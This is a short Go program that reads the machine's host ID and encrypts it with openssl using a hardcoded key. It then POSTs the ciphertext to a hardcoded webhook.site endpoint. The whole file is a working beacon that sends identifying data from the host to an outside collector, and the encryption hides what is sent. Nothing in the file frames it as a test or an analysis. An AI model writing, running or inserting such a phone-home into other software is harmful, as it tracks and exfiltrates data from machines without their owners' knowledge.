package main

import (
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"

	"github.com/shirou/gopsutil/host"
)

var link = "https://webhook.site/6fa01dd1-d7af-4e84-b221-1e72c55ca5fe"
var plaintext_key = "very-long-plaintext-key:)"

func main() {
	hostStat, _ := host.Info()

	data := url.Values{
		"host": {hostStat.HostID},
	}

	cmd := exec.Command("/usr/bin/openssl", "aes-128-cbc", "-e", "-a", "-pbkdf2", "-k", plaintext_key)
	cmd.Stdin = strings.NewReader(data.Encode())
	out, err := cmd.Output()

	if err != nil {
		log.Fatal(err)
	}

	req, err := http.NewRequest("POST", link, strings.NewReader(string(out)))

	if err != nil {
		panic(err)
	}

	client := http.Client{}
	_, err = client.Do(req)

	if err != nil {
		log.Printf("Request Failed: %s", err)
		return
	} else {
		log.Printf("Done :)")
	}

}
